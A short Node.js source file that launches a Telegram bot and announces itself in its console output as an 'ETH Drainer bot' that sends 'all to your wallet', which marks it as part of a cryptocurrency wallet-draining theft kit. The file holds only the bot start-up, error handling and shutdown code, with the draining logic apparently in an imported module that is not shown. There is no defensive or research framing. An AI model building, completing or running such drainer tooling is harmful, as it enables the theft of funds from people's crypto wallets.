import TelegramBot from 'node-telegram-bot-api';
import { MS_Telegram_Token, setupTelegramBot } from './utils/Utilite';
import app from './index';

const bot = new TelegramBot(MS_Telegram_Token, { polling: true });

setupTelegramBot(bot);

bot.on('polling_error', (error) => {
  console.log('Polling error:', error);
});

process.on('SIGINT', () => {
  bot.stopPolling();
  process.exit();
});

console.log('Your ETH Drainer bot running - all to your wallet.');